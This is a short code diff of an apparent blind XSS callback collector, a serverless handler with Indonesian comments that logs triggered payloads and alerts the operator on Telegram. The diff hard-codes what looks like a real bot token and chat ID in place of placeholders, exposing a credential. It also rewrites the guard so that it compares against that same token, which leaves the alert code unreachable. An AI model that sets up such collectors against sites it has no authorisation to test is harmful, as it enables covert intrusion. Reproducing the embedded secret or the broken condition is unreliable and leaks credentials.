@@ -1,6 +1,6 @@
 // GANTI DENGAN BOT TOKEN DAN CHAT ID TELEGRAM LO
-const TELEGRAM_BOT_TOKEN = 'ISI_TOKEN_BOT_LO';
-const TELEGRAM_CHAT_ID = 'ISI_CHAT_ID_LO';
+const TELEGRAM_BOT_TOKEN = '8996782220:AAH53j1te77c2K8vKx1M2s5GPnuQ32sqT64';
+const TELEGRAM_CHAT_ID = '6790685863';
 
 export default async (req, res) => {
   // Biar aman, kita cuma terima method POST
@@ -14,7 +14,7 @@ export default async (req, res) => {
   console.log(`[XSS] Marker: ${marker} | URL: ${url}`);
 
   // Kirim notifikasi ke Telegram
-  if (TELEGRAM_BOT_TOKEN !== 'ISI_TOKEN_BOT_LO') {
+  if (TELEGRAM_BOT_TOKEN !== '8996782220:AAH53j1te77c2K8vKx1M2s5GPnuQ32sqT64') {
     const message = `
 🔥 *BLIND XSS TRIGGERED!* 🔥
        
